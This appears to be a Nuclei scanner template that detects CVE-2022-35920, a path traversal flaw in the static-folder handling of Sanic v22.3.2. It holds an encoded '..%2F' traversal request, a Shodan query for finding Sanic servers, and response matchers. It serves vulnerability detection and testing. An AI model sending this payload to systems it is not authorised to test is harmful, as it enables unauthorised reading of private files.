id: CVE-2022-35920

info:
  name: Sanic v22.3.2 - Path Traversal
  author: arafatansari
  severity: medium
  description: |
    Sanic is an opensource python web server/framework. Sanic's v22.3.2 is vulnerable to Path Traversal in static folder. Affected versions of sanic allow access to lateral directories when using `app.static` if using encoded `%2F` URLs. Parent directory traversal is not impacted.
  reference:
    - https://github.com/sanic-org/sanic/issues/2478
    - https://nvd.nist.gov/vuln/detail/CVE-2022-35920
  metadata:
    verified: true
    shodan-query: http.html:"Sanic"
  tags: sanic,lfi,traversal

requests:
  - method: GET
    path:
      - "{{BaseURL}}/static/public/..%2F/private/secret_content.txt"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "QUERY_STRING"
          - "DOCUMENT_ROOT"
        condition: and

      - type: status
        status:
          - 404
